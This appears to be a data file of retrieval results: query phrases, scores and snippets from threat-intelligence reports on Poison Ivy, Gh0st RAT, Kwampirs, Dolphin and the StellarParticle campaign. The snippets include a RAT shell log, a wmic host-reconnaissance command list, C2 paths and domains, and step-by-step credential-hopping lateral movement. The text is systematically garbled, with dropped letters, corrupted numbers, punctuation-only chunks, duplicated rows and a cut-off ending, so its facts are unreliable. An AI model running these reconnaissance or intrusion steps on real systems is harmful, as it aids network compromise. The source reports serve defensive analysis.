62589cf5643f8cfe04ac39602119309c,using the API,0.7905058782555826,"['2. id .', 'POST.', ': { ""ID"": 1, ""Language"": ""AR"", ""KeyWords"": [ ""*"", ""Sergy*"", ""356"", ""Test rub 3589"", ""Last Ad rub 67"" ] } 1. : {ip}:9850/api/rubriclist?Parent=-1 / {ip}:9850/api/rubriclist?Parent=20 / Parent=20 : [ { ""ID"": 0, ""ID1"": 0, ""Parent"": nul, ""Name"": ""Uknown"" }, { ""ID"": 1, ""ID1"": 1, ""Parent"": 0, ""Name"": ""Garbage"" 25 },. ]', ': Url=""/json/rubrics/5 2. : {ip}:9850/api/rubriclist api/LanguageList : [ { ""ID"": 0, ""ID1"": 0, ""ShortName"": ""UN"", ""Name"": ""UN-Unknown"" }, { ""ID"": 1, ""ID1"": 1, ""ShortName"": ""A"", ""Name"": ""A-Afar"" }, { ""ID"": 2, ""ID1"": 2, ""ShortName"": ""AB"", ""Name"": ""AB-Abkhazian"" },. ]', 'API .', '.', ', .', '.', '- .', '26 - , (), (), ().', '- .']"
62589cf5643f8cfe04ac39602119309c,using the API,0.7905058782555826,"['2. id .', 'POST.', ': { ""ID"": 1, ""Language"": ""AR"", ""KeyWords"": [ ""*"", ""Sergy*"", ""356"", ""Test rub 3589"", ""Last Ad rub 67"" ] } 1. : {ip}:9850/api/rubriclist?Parent=-1 / {ip}:9850/api/rubriclist?Parent=20 / Parent=20 : [ { ""ID"": 0, ""ID1"": 0, ""Parent"": nul, ""Name"": ""Uknown"" }, { ""ID"": 1, ""ID1"": 1, ""Parent"": 0, ""Name"": ""Garbage"" 25 },. ]', ': Url=""/json/rubrics/5 2. : {ip}:9850/api/rubriclist api/LanguageList : [ { ""ID"": 0, ""ID1"": 0, ""ShortName"": ""UN"", ""Name"": ""UN-Unknown"" }, { ""ID"": 1, ""ID1"": 1, ""ShortName"": ""A"", ""Name"": ""A-Afar"" }, { ""ID"": 2, ""ID1"": 2, ""ShortName"": ""AB"", ""Name"": ""AB-Abkhazian"" },. ]', 'API .', '.', ', .', '.', '- .', '26 - , (), (), ().', '- .']"
62589cf5643f8cfe04ac39602119309c,using the API,0.7905058782555826,"['2. id .', 'POST.', ': { ""ID"": 1, ""Language"": ""AR"", ""KeyWords"": [ ""*"", ""Sergy*"", ""356"", ""Test rub 3589"", ""Last Ad rub 67"" ] } 1. : {ip}:9850/api/rubriclist?Parent=-1 / {ip}:9850/api/rubriclist?Parent=20 / Parent=20 : [ { ""ID"": 0, ""ID1"": 0, ""Parent"": nul, ""Name"": ""Uknown"" }, { ""ID"": 1, ""ID1"": 1, ""Parent"": 0, ""Name"": ""Garbage"" 25 },. ]', ': Url=""/json/rubrics/5 2. : {ip}:9850/api/rubriclist api/LanguageList : [ { ""ID"": 0, ""ID1"": 0, ""ShortName"": ""UN"", ""Name"": ""UN-Unknown"" }, { ""ID"": 1, ""ID1"": 1, ""ShortName"": ""A"", ""Name"": ""A-Afar"" }, { ""ID"": 2, ""ID1"": 2, ""ShortName"": ""AB"", ""Name"": ""AB-Abkhazian"" },. ]', 'API .', '.', ', .', '.', '- .', '26 - , (), (), ().', '- .']"
57c72cba1b008593ba3d60f214807584,using the API,0.7905058782555826,"['Initializing module poisonivy_23x Transfered files wil be saved.', 'Scren/Cam/Audio/Key captures wil be saved.', 'Runing Modules .', '[2013-07-03 06:46:29 PDT] Poison Ivy Version:2.32 [2013-07-03 06:46:30 PDT]* Host Information* PI profile ID: mal IP adres: 192.168.0.12 Hostname: BLUE Windows User: admin Windows Version: Windows XP Windows Build: 260 Service Pack: Service Pack 3 [2013-07-03 06:46:36 PDT] * Shel Sesion * Microsoft Windows XP [Version 5.1.260] (C) Copyright 1985-201 Microsoft Corp. C:\\> [2013-07-03 06:46:42 PDT] * Shel Sesion * ipconfig [2013-07-03 06:46:43 PDT] * Shel Sesion * Windows IP Configuration Conection-specific DNS Sufix .', ': IP Adres.', '.', '.', '.', '.', '.', '.']"
7fd321bf3d665b1e21967c3a8052d876,using the API,0.7905058782555826,"['Initializing module poisonivy_23x Transfered files wil be saved.', 'Scren/Cam/Audio/Key captures wil be saved.', 'Runing Modules .', '[2013-07-03 06:46:29 PDT] Poison Ivy Version:2.32 [2013-07-03 06:46:30 PDT]* Host Information* PI profile ID: mal IP adres: 192.168.0.12 Hostname: BLUE Windows User: admin Windows Version: Windows XP Windows Build: 260 Service Pack: Service Pack 3 [2013-07-03 06:46:36 PDT] * Shel Sesion * Microsoft Windows XP [Version 5.1.260] (C) Copyright 1985-201 Microsoft Corp. C:\\> [2013-07-03 06:46:42 PDT] * Shel Sesion * ipconfig [2013-07-03 06:46:43 PDT] * Shel Sesion * Windows IP Configuration Conection-specific DNS Sufix .', ': IP Adres.', '.', '.', '.', '.', '.', '.']"
88d674726f92a0b205d41f6b44c23d24,computer name,0.9939697234121188,[]
88d674726f92a0b205d41f6b44c23d24,computer name,0.9939697234121188,[]
272d3c74c836029cd04557377079991e,computer name,0.7631110073603482,"['probable targets.', 'becomes part of a unique ""browser fingerprint"" that can identify the users computer moving forward.', '4 SPECIAL REPORT Pinpointing Targets: Exploiting Web Analytics to Ensnare Victims THE OPERATION B egining last year, we identified cyber When an unsuspecting user visits any of the actors integrating fre, publicly available over 10 compromised websites, a smal piece The folowing are tols with custom scripts to monitor the of inserted codembeded in the sites HTML examples of some of the online activities of Internet users without their and invisible to casual visitorsquietly redirects web tols embeded knowledge,2 just as corporations track the online the users browser to a second compromised in the WITCHCOVEN activity of web users around the world.', 'We website without the users knowledge.', 'This code and the data they colect: believe these cyber threat actors are building second website hosts the WITCHCOVEN profiles of potential victims and learning about script,4 which uses profiling techniques to colect the vulnerabilities in users computers.', 'These very technical information on the users computer.', 'same technologies that marketing firms use to As of early November 2015, we identified a track their clients and ensure their websites work total of 14 websites hosting the WITCHCOVEN on diferent types of web browsers can help cyber profiling script.', 'The detect Ofice threat actors beter identify their victims and module from the tailor future infection atempts.', 'Browser Exploitation We believe these cyber threat Framework,5 an open The cyber threat actors start by compromising source penetration actors are building profiles of large numbers of legitimate websites.', 'The testing tol, determines potential victims and learning websites are not randomly chosen targets of the Microsoft Ofice oportunity, but specificaly selected as part of about the vulnerabilities in version on a computer a tactic caled a strategic web compromise.3 The users computers.', 'by testing the browsers atackers then modify the underlying HTML response to various ActiveX objects.']"
272d3c74c836029cd04557377079991e,computer name,0.7631110073603482,"['probable targets.', 'becomes part of a unique ""browser fingerprint"" that can identify the users computer moving forward.', '4 SPECIAL REPORT Pinpointing Targets: Exploiting Web Analytics to Ensnare Victims THE OPERATION B egining last year, we identified cyber When an unsuspecting user visits any of the actors integrating fre, publicly available over 10 compromised websites, a smal piece The folowing are tols with custom scripts to monitor the of inserted codembeded in the sites HTML examples of some of the online activities of Internet users without their and invisible to casual visitorsquietly redirects web tols embeded knowledge,2 just as corporations track the online the users browser to a second compromised in the WITCHCOVEN activity of web users around the world.', 'We website without the users knowledge.', 'This code and the data they colect: believe these cyber threat actors are building second website hosts the WITCHCOVEN profiles of potential victims and learning about script,4 which uses profiling techniques to colect the vulnerabilities in users computers.', 'These very technical information on the users computer.', 'same technologies that marketing firms use to As of early November 2015, we identified a track their clients and ensure their websites work total of 14 websites hosting the WITCHCOVEN on diferent types of web browsers can help cyber profiling script.', 'The detect Ofice threat actors beter identify their victims and module from the tailor future infection atempts.', 'Browser Exploitation We believe these cyber threat Framework,5 an open The cyber threat actors start by compromising source penetration actors are building profiles of large numbers of legitimate websites.', 'The testing tol, determines potential victims and learning websites are not randomly chosen targets of the Microsoft Ofice oportunity, but specificaly selected as part of about the vulnerabilities in version on a computer a tactic caled a strategic web compromise.3 The users computers.', 'by testing the browsers atackers then modify the underlying HTML response to various ActiveX objects.']"
c89a6cfa1e6eb16768ede2ce52695f89,computer name,0.7631110073603482,"['versions of the RAT including the ability to start a 204 52 Unknown.', 'comand shel, control proceses and services, 256 32 Nulterminated computername(if upload/download files, terminate TCP conections, sucesfulyobtainedfromthesystem).', 'createuseracounts, retrievesystem information, log 28 12 Procesname.', 'useractivity(viakeyloger), modifytimestamps on 30 52 0x0 bytes inalobserved files, conduct proces injection, conduct denial of comunications.', 'service atacks and shutdown or restart the 352 36 SYSTEM_INFO16structure(format showninAnexB).', 'computer.', 'Comands suported by the XShel softwarearelisted inAnexC.', '(XTiger) 38 72 0x0 bytes inalobserved samples.', '460 12 Unknown.', '472 4 Localeidentifier17.', '18Theproces svchost.exe isagenerichostprocesforservices 476 4 Tick count(repeated).']"
b5d067b705e3d7716dc5cd360e61cc7d,the scheduled task,0.7685556425653723,"['The namespaces and clases from the deobfuscated samples 1 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Al the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.', 'The decrypted strings are as folows: 1.', 'The MagicString clas provides a geter property, which decrypts strings on aces.', '2.', 'The MagicString clas has an encrypted string field.', '3.', 'The MagicString clas provides _Decrypt, a wraper method for decryption.', '4.', 'If it is StealthMutants first time to use the _Decrypt method, the AES (Advanced Encryption Standard) key and initialization vector (IV) wil be initialized based on the hard-coded _factory value, although this IV is meaningles in Electronic Code Block (ECB) mode.', 'The key is the SHA-256 hash, while the IV is the MD5 hash.', 'The values of the SHA-256 and MD5 hashes vary with each StealthMutant sample.']"
751a00c60e4d6cfbca29fd60f12530fc,the scheduled task,0.7781410850046253,"['Tactic ID Name Description Initial ScarCruft uses watering-hole atacks to T189 Drive-by Compromise Aces compromise victims.', 'Execution Comand and Scripting Interpreter: T1059.06 The Dolphin loader a uses Python script.', 'Python 7/8 Tactic ID Name Description Comand and Scripting Interpreter: ScarCruft used malicious JavaScript for a T1059.07 JavaScript watering-hole atack.', 'ScarCruft exploits CVE-2020-1380 to T1203 Exploitation for Client Execution compromise victims.', 'Dolphin uses Windows API functions to execute T106 Native API files and inject proceses.', 'Scheduled Task/Job: Scheduled Dolphin uses a temporary scheduled task to T1053.05 Task start after instalation.', 'Persistence Bot or Logon Autostart Execution: Dolphin uses Run keys for persistence of its T1547.01 Registry Run Keys / Startup Folder loader.', 'Proces Injection: Portable Defense T105.02 Dolphin can inject into other proceses.', 'Executable Injection Evasion T1027 Obfuscated Files or Information Dolphin has encrypted components.', 'Credentials from Pasword Stores: Dolphin can obtain saved paswords from Credential T15.03 Credentials from Web Browsers browsers.', 'Aces T1539 Steal Web Sesion Cokie Dolphin can obtain cokies from browsers.']"
decab25100660c0deaa8f97d0f3bf308,the scheduled task,0.7570666302157529,"['Figure 7.', 'Intrusion flow sequence diagram An overview of whats shown in the sequence diagram above is the folowing: 1.', 'On launch, the primary NoxPlayer executable Nox.exe wil send a request via the API to query update information.', '2.', 'The BigNox API server responds to the client request with specific update information, including the URL to download the update from BigNox legitimate infrastructure.', '3.', 'Nox.exe provides the apropriate parameters to NoxPlayer.exe to download the update.', '4.', 'The legitimate update stored in BigNox infrastructure could have ben replaced with malware, or it may be a new filename/URL not used by legitimate updates.', '5.', 'Malware is instaled on the victims machine.']"
cae33c8970a53857dff6608fe8894b8a,the scheduled task,0.985024430381845,"['Copyright Leonardo S.p.a. Al rights reserved 2 Company General Use MALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 6.', 'MITRE AT&CK TPs T1059 Comand-Line Comand-line interfaces provide a way of interacting with computer Interface systems and is a comon feature acros many types of operating system platforms.', 'One example comand-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Comand-line interfaces can be interacted with localy or remotely via a remote desktop aplication, reverse shel sesion, etc.', 'Comands that are executed run with the curent permision level of the comand-line interface proces unles the comand includes proces invocation that changes permisions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a wel-established method used by both defenders and adversaries to hide open ports from aces.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port wil be opened.', 'Usualy this series of packets consists of atempted conections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often acomplished by the host based firewal, but could also be implemented by custom software.', 'T105 Remote File Files may be copied from one system to another to stage adversary Copy tols or other files over the course of an operation.']"
a9e5224d5686f541f8796eb25399c125,the scheduled task,0.7766735279216095,"['RESEARCH_ Docles Vietnam APT Inovacin y laboratorio April 2019 elevenpaths.com RESEARCH_ Docles Vietnam APT -A technique stil alive- Index What have we discovered?', '.', '3 Globaly Unique Identifier (GUID) .', '3 Docles DOC with thre stages .', '4 DOS OBFUSCATION .', '5 DISKLES POWERSHEL.', '6 The final stage, uninstaling yourself .']"
0797d04ce55799cf7c3246d39567ce99,the scheduled task,0.8423798151463229,"['Analyze The recipients of the document 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf 8.t are (at the end of the document): the deputy minister; - the units under the ministry; - police of provinces and cities directly under the central government; - Department of Inspection of Legal Documents of the Ministry of Justice; - Oficial Journal, Government Electronic Portal, Ministry of Public Security Portal; - Archive: VT, C06 (P1).', 'The document exploits Equation Editor starts aplication (CVE-2017182) to decode the 8.t in memory, after fork to instal two files: C:\\Users\\admin\\ApData\\Local\\Temp\\wsc.dl 4e8f8a3c3be45e0a59a868f2b2ace51754fcdbfa9ab618e3d9d0e1783190f and C:\\Users\\admin\\ApData\\Local\\Temp\\wsc_proxy.exe 1948b0df1f768d6d30ae7ecec50db7c817d09cb31b5e2ce9b86a4047da The malware is a dl, it sems to be Gh0st RAT.', 'htps:/ap.any.run/tasks/5715cfe3-250-4808-ad0-1ea4c4fc7a8 An to start the malware, it uses a side loading technics with a scheduled Task.', 'The exe cal in the entry loads dynamicaly wsc.dl and cal the function _run@4 htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 1/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Side Loading Scheduled Task The RAT tries to conect to nicetis54.lflink.com|185.216.35.1.', 'htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 2/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Threat Inteligence Consideration We have the same Tps and victimology like Goblin Panda: Oficials Vietnameses Side Loading 8.t RTF kit exploit a dynamic dns name But the payload has changed and the launch of the backdor has changed.', 'Its used a scheduled task.', 'Usualy this group uses NewCoreRat.', 'IOCs Main object- 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf sha256 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf sha1 6e670a837970a1fb4161d7d5f720d318d7e4dbc md5 f3451418eb4689560cd6c0c654f26d9 Droped executable file sha256 C:\\Users\\admin\\ApData\\Local\\Temp\\wsc.dl 4e8f8a3c3be45e0a59a868f2b2ace51754fcdbfa9ab618e3d9d0e1783190f sha256 C:\\Users\\admin\\ApData\\Local\\Temp\\wsc_proxy.exe 1948b0df1f768d6d30ae7ecec50db7c817d09cb31b5e2ce9b86a4047da htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 3/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese DNS requests domain nicetis54.lflink.com Conections ip 185.216.35.1 htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 4/4']"
0797d04ce55799cf7c3246d39567ce99,the scheduled task,0.8423798151463229,"['Analyze The recipients of the document 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf 8.t are (at the end of the document): the deputy minister; - the units under the ministry; - police of provinces and cities directly under the central government; - Department of Inspection of Legal Documents of the Ministry of Justice; - Oficial Journal, Government Electronic Portal, Ministry of Public Security Portal; - Archive: VT, C06 (P1).', 'The document exploits Equation Editor starts aplication (CVE-2017182) to decode the 8.t in memory, after fork to instal two files: C:\\Users\\admin\\ApData\\Local\\Temp\\wsc.dl 4e8f8a3c3be45e0a59a868f2b2ace51754fcdbfa9ab618e3d9d0e1783190f and C:\\Users\\admin\\ApData\\Local\\Temp\\wsc_proxy.exe 1948b0df1f768d6d30ae7ecec50db7c817d09cb31b5e2ce9b86a4047da The malware is a dl, it sems to be Gh0st RAT.', 'htps:/ap.any.run/tasks/5715cfe3-250-4808-ad0-1ea4c4fc7a8 An to start the malware, it uses a side loading technics with a scheduled Task.', 'The exe cal in the entry loads dynamicaly wsc.dl and cal the function _run@4 htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 1/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Side Loading Scheduled Task The RAT tries to conect to nicetis54.lflink.com|185.216.35.1.', 'htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 2/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Threat Inteligence Consideration We have the same Tps and victimology like Goblin Panda: Oficials Vietnameses Side Loading 8.t RTF kit exploit a dynamic dns name But the payload has changed and the launch of the backdor has changed.', 'Its used a scheduled task.', 'Usualy this group uses NewCoreRat.', 'IOCs Main object- 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf sha256 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf sha1 6e670a837970a1fb4161d7d5f720d318d7e4dbc md5 f3451418eb4689560cd6c0c654f26d9 Droped executable file sha256 C:\\Users\\admin\\ApData\\Local\\Temp\\wsc.dl 4e8f8a3c3be45e0a59a868f2b2ace51754fcdbfa9ab618e3d9d0e1783190f sha256 C:\\Users\\admin\\ApData\\Local\\Temp\\wsc_proxy.exe 1948b0df1f768d6d30ae7ecec50db7c817d09cb31b5e2ce9b86a4047da htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 3/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese DNS requests domain nicetis54.lflink.com Conections ip 185.216.35.1 htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 4/4']"
9ab2a2b129fe2a9a6ead5e11370087f0,Decrypted strings,0.9171857619111754,"['ESET Research White Paper / January 2021 TLP: WHITE A WILD KOBALOS APEARS Tricksy Linux malware goes after HPCs Marc-Etiene M.Lveil Ignacio Sanmilan TABLE OF CONTENTS 1.', 'Executive sumary .', '.', '.', '.', '.', '.', '.']"
fcef139433bae54ea996aa09f7e1fcf4,The decryption function,0.8354975659888249,"['The executables were sen with the filenames ""Update.exe"", ""ntfsc.exe"" or ""nx"" in this campaign.', 'They are either downloaded or droped into the victim\'s ""local aplication data"" folder and run as a Windows Security update with medium integrity to elevate the privileges of a standard user.', 'The actor uses comon encoding techniques to obfuscate strings in the WinMain function to hide its behavior from static analysis tols.', 'WinMain function snipet.', 'The decryption function receives the encrypted strings and decrypts each character with the XOR operation and stores the result in an aray that wil be returned to the caler function.', '1/19 Decryption function.', ""The malware searches for the Windows Defender and Kaspersky antivirus proceses in the victim's machine by creating the snapshot of runing proceses using CreateTolhelp32Snapshot and iterates through each proces using API Proces32First and Proces32Next."", 'WinMain() snipet showing antivirus proces detection.', ""12/19 The information-gathering function gathers the victim's hostname, operating system product name, and the victim's username and writes them into a memory bufer."", 'Information-gathering function.', 'The C2 comunicating function at ofset 401C50 is caled from the two other requests making functions to send the victim\'s information with the decrypted strings ""xnb/dxagt5avb2.php?txt="" and ""data1.php?']"
fcef139433bae54ea996aa09f7e1fcf4,Decryption function,0.8506039784321054,"['The executables were sen with the filenames ""Update.exe"", ""ntfsc.exe"" or ""nx"" in this campaign.', 'They are either downloaded or droped into the victim\'s ""local aplication data"" folder and run as a Windows Security update with medium integrity to elevate the privileges of a standard user.', 'The actor uses comon encoding techniques to obfuscate strings in the WinMain function to hide its behavior from static analysis tols.', 'WinMain function snipet.', 'The decryption function receives the encrypted strings and decrypts each character with the XOR operation and stores the result in an aray that wil be returned to the caler function.', '1/19 Decryption function.', ""The malware searches for the Windows Defender and Kaspersky antivirus proceses in the victim's machine by creating the snapshot of runing proceses using CreateTolhelp32Snapshot and iterates through each proces using API Proces32First and Proces32Next."", 'WinMain() snipet showing antivirus proces detection.', ""12/19 The information-gathering function gathers the victim's hostname, operating system product name, and the victim's username and writes them into a memory bufer."", 'Information-gathering function.', 'The C2 comunicating function at ofset 401C50 is caled from the two other requests making functions to send the victim\'s information with the decrypted strings ""xnb/dxagt5avb2.php?txt="" and ""data1.php?']"
fcef139433bae54ea996aa09f7e1fcf4,the decryption function,0.8354975659888249,"['The executables were sen with the filenames ""Update.exe"", ""ntfsc.exe"" or ""nx"" in this campaign.', 'They are either downloaded or droped into the victim\'s ""local aplication data"" folder and run as a Windows Security update with medium integrity to elevate the privileges of a standard user.', 'The actor uses comon encoding techniques to obfuscate strings in the WinMain function to hide its behavior from static analysis tols.', 'WinMain function snipet.', 'The decryption function receives the encrypted strings and decrypts each character with the XOR operation and stores the result in an aray that wil be returned to the caler function.', '1/19 Decryption function.', ""The malware searches for the Windows Defender and Kaspersky antivirus proceses in the victim's machine by creating the snapshot of runing proceses using CreateTolhelp32Snapshot and iterates through each proces using API Proces32First and Proces32Next."", 'WinMain() snipet showing antivirus proces detection.', ""12/19 The information-gathering function gathers the victim's hostname, operating system product name, and the victim's username and writes them into a memory bufer."", 'Information-gathering function.', 'The C2 comunicating function at ofset 401C50 is caled from the two other requests making functions to send the victim\'s information with the decrypted strings ""xnb/dxagt5avb2.php?txt="" and ""data1.php?']"
d5019121cbc645eb0787efab173a12b3,wmic,0.7832871736269563,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
949b57ffdfcc42e1765f65e65995733b,wmic,0.862634642643921,[]
949b57ffdfcc42e1765f65e65995733b,wmic,0.8873197545818806,"['This module executes a series of comands to gather aditional host information, which is subsequently uploaded to a C2 server.', 'Interestingly, the comands are not identical to the analogous module examined in the initial Symantec report.', 'These comands executed by this module are almost al wmic comands and are used to retrieve extensive information related to the computer, drivers, IRQs, baseboard, partitions, bios, logon, logical disks - a complete radiography of the system, displayed at Snipet 9.', 'Figure 29: Kwampirs making use of proxy and proxy bypas configuration arays with an iterator (v2).', 'Shamon 1, 2 and 3 and Kwampirs, al contain arays for C2, and Proxy, ProxyByPas, and acesType information.', 'INDEX cylera.com 24 ANALYSIS SECTIONS The linkage betwen Kwampirs and Shamon hostname getmac ver arp -a systeminfo wmic nic get caption,AdapterType,Manufacturer wmic timezone get caption wmic IRQ get caption, IRQNumber wmic port get StartingAdres, EndingAdres wmic csproduct wmic computerSystem wmic baseboard wmic cpu wmic partition wmic bios wmic startup wmic netlogin wmic portconector wmic memphysical wmic share wmic logon wmic OS wmic logicaldisk get caption,description,size,providername wmic desktop Snipet 9: Kwampirs comands found in a module downloaded by the reporter.', 'Considering the level of detail found in the information gathered, it sems likely that the use of this module is intended for a reconaisance phase.', 'The types of information gathered may imply that the physical atributes of the device are of interest.', 'This may imply that the ultimate goal of the campaign only relates to devices that satisfy particular physical properties that can be infered from this information.', 'INDEX cylera.com 25 ANALYSIS SECTIONS The linkage betwen Kwampirs and Shamon 5.1.5 Artifact Similarities File Metadata The metadata of the droper and reporter components (DL and EXE) are based on metadata taken from legitimate Microsoft files in both Kwampirs and Shamon (Figures 30, 31, 32 and 3), but in the case of Kwampirs, metadata from other files/companies was also used in later campaigns.', 'Kwampirs Droper Shamon Droper Figure 30: Kwampirs droper metadata Figure 31: Shamon droper metadata INDEX cylera.com 26 ANALYSIS SECTIONS The linkage betwen Kwampirs and Shamon Kwampirs Reporter Shamon Reporter Figure 32: Kwampirs reporter metadata Figure 3: Kwampirs reporter metadata It is worth noting that the metadata of later Kwampirs samples loks diferent and contains many diferent tols.']"
c91a9ca760ed281ab3a6e831ccac7850,wmic,0.7848694123347798,"['61 MS14-058 Exploit .', '45 WinRM .', '18 MS14-068 Exploit .', '49 WinRS .', '20 MS15-078 Exploit .', '46 wmic .', '13 wmiexec.vbs .', '15 7 JPCERT/C 78']"
c91a9ca760ed281ab3a6e831ccac7850,wmic,0.7848694123347798,"['61 MS14-058 Exploit .', '45 WinRM .', '18 MS14-068 Exploit .', '49 WinRS .', '20 MS15-078 Exploit .', '46 wmic .', '13 wmiexec.vbs .', '15 7 JPCERT/C 78']"
7a70ba0573c3747eb8c7b89216436246,the malicious authentications into victim O365 tenants had originated from within the victim’s own network.,0.7559294873571896,"['Throughout 2020, an operation atributed to the Foreign Inteligence Service of the Rusian Federation (SVR) by the U.S. government was conducted to gain aces to the update mechanism of the SolarWinds IT management software and use it to broaden their inteligence colection capabilities.', 'This activity is tracked by CrowdStrike as the StelarParticle campaign and is asociated with the COZY BEAR adversary group.', '1/21 This blog discuses the novel tactics and techniques leveraged in StelarParticle investigations conducted by CrowdStrike.', 'These techniques include: Credential hoping for obscuring lateral movement Ofice 365 (O365) Service Principal and Aplication hijacking, impersonation and manipulation Stealing browser cokies for bypasing multifactor authentication Use of the TrailBlazer implant and the Linux variant of GoldMax malware Credential theft using Get-ADReplAcount Credential Hoping The majority of StelarParticle-related investigations conducted by CrowdStrike have started with the identification of adversary actions within a victims O365 environment.', 'This has ben advantageous to CrowdStrike incident responders in that, through investigating victim O365 environments, they could gain an acurate acounting of time, acount and source IP adres of adversary victimization of the O365 tenant.', 'In multiple engagements, this led CrowdStrike incident responders to identify that the malicious authentications into victim O365 tenants had originated from within the victims own network.', 'Armed with this information, CrowdStrike investigators were able to identify from which systems in these internal networks the threat actor was making authentications to O365.', 'These authentications would typicaly ocur from servers in the environment, leading to natural investigative questions: Why would a user authenticate into O365 from a domain controler or other infrastructure server?', 'What credentials were used as part of the sesion from which the O365 authentication ocured?', 'This led our responders to identify the ocurence of credential hoping, where the threat actor leveraged diferent credentials for each step while moving lateraly through the victims network.', 'While this particular technique is not necesarily unique to the StelarParticle campaign, it indicates a more advanced threat actor and may go unoticed by a victim.']"
07447feab95478f8fcc0cbd0d028f9f5,the malicious authentications into victim O365 tenants had originated from within the victim’s own network.,0.7559294873571896,"['Throughout 2020, an operation atributed to the Foreign Inteligence Service of the Rusian Federation (SVR) by the U.S. government was conducted to gain aces to the update mechanism of the SolarWinds IT management software and use it to broaden their inteligence colection capabilities.', 'This activity is tracked by CrowdStrike as the StelarParticle campaign and is asociated with the COZY BEAR adversary group.', '1/21 This blog discuses the novel tactics and techniques leveraged in StelarParticle investigations conducted by CrowdStrike.', 'These techniques include: Credential hoping for obscuring lateral movement Ofice 365 (O365) Service Principal and Aplication hijacking, impersonation and manipulation Stealing browser cokies for bypasing multifactor authentication Use of the TrailBlazer implant and the Linux variant of GoldMax malware Credential theft using Get-ADReplAcount Credential Hoping The majority of StelarParticle-related investigations conducted by CrowdStrike have started with the identification of adversary actions within a victims O365 environment.', 'This has ben advantageous to CrowdStrike incident responders in that, through investigating victim O365 environments, they could gain an acurate acounting of time, acount and source IP adres of adversary victimization of the O365 tenant.', 'In multiple engagements, this led CrowdStrike incident responders to identify that the malicious authentications into victim O365 tenants had originated from within the victims own network.', 'Armed with this information, CrowdStrike investigators were able to identify from which systems in these internal networks the threat actor was making authentications to O365.', 'These authentications would typicaly ocur from servers in the environment, leading to natural investigative questions: Why would a user authenticate into O365 from a domain controler or other infrastructure server?', 'What credentials were used as part of the sesion from which the O365 authentication ocured?', 'This led our responders to identify the ocurence of credential hoping, where the threat actor leveraged diferent credentials for each step while moving lateraly through the victims network.', 'While this particular technique is not necesarily unique to the StelarParticle campaign, it indicates a more advanced threat actor and may go unoticed by a victim.']"
7a70ba0573c3747eb8c7b89216436246,Log in to O365 as a user with privileged access to cloud resources.,0.8556175027720407,"['This led our responders to identify the ocurence of credential hoping, where the threat actor leveraged diferent credentials for each step while moving lateraly through the victims network.', 'While this particular technique is not necesarily unique to the StelarParticle campaign, it indicates a more advanced threat actor and may go unoticed by a victim.', 'Below is an example of how a threat actor performs credential hoping: Gain aces to the victims network by loging into a public-facing system via Secure Shel (SH) using a local acount <user sftp> acquired during previous credential theft activities.', 'Use port forwarding capabilities built into SH on the public-facing system to establish a Remote Desktop Protocol (RDP) sesion to an internal server (Server 1) using a domain service acount.', 'From Server 1, establish another RDP sesion to a diferent internal server (Server 2) using a domain administrators acount.', 'Log in to O365 as a user with privileged aces to cloud resources.', '2/21 Figure 1.', 'Example of credential hoping technique This technique could be hard to identify in environments where defenders have litle visibility into identity usage.', 'In the example shown in Figure 1, the threat actor leveraged a service interactively, which should generate detections for defenders to investigate.', 'However, the threat actor could have easily used a second domain administrator acount or any other combination of acounts that would not be easily detected.', 'A solution such as CrowdStrike Falcon Identity Threat Detection would help identify these anomalous logons and especialy infrequent destinations for acounts.']"
07447feab95478f8fcc0cbd0d028f9f5,Log in to O365 as a user with privileged access to cloud resources.,0.8556175027720407,"['This led our responders to identify the ocurence of credential hoping, where the threat actor leveraged diferent credentials for each step while moving lateraly through the victims network.', 'While this particular technique is not necesarily unique to the StelarParticle campaign, it indicates a more advanced threat actor and may go unoticed by a victim.', 'Below is an example of how a threat actor performs credential hoping: Gain aces to the victims network by loging into a public-facing system via Secure Shel (SH) using a local acount <user sftp> acquired during previous credential theft activities.', 'Use port forwarding capabilities built into SH on the public-facing system to establish a Remote Desktop Protocol (RDP) sesion to an internal server (Server 1) using a domain service acount.', 'From Server 1, establish another RDP sesion to a diferent internal server (Server 2) using a domain administrators acount.', 'Log in to O365 as a user with privileged aces to cloud resources.', '2/21 Figure 1.', 'Example of credential hoping technique This technique could be hard to identify in environments where defenders have 